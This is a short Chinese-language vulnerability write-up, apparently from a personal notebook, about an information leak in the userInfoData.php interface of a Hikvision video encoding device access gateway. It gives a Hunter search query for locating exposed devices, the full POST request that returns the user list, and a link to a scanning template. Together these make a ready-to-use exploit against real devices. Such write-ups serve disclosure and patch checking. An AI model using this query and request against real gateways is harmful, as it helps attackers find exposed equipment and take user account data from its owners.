# 海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞

# 一、漏洞简介
海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞。

# 二、影响版本
+ HIKVISION 视频编码设备接入网关

# 三、资产测绘
+ hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"`

![1691857505004-d8663f3c-62e3-4cac-8909-21305e690fea.png](./img/qV-R5KN1BBW4A5If/1691857505004-d8663f3c-62e3-4cac-8909-21305e690fea-364641.png)

+ 登录页面

![1691857519082-eb318732-d51e-4393-89a9-7296293727ba.png](./img/qV-R5KN1BBW4A5If/1691857519082-eb318732-d51e-4393-89a9-7296293727ba-071734.png)

# 四、漏洞复现
```plain
POST /data/userInfoData.php HTTP/1.1
Host: 
Content-Length: 38
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin:
Referer:
Accept-Language: zh-CN,zh;q=0.9
Connection: close

page=1&rows=20&sort=userId&order=asc
```

![1711075731488-6717f765-229a-4079-a292-92c54ee39180.png](./img/qV-R5KN1BBW4A5If/1711075731488-6717f765-229a-4079-a292-92c54ee39180-702744.png)

[hikvision-spbmjrwg-userinfodate-info.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1711075901506-37d4c294-7138-466e-b8bb-17d265f17fe6.yaml)



> 更新: 2024-03-22 10:51:47  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zq2np1ubh0igzfoa>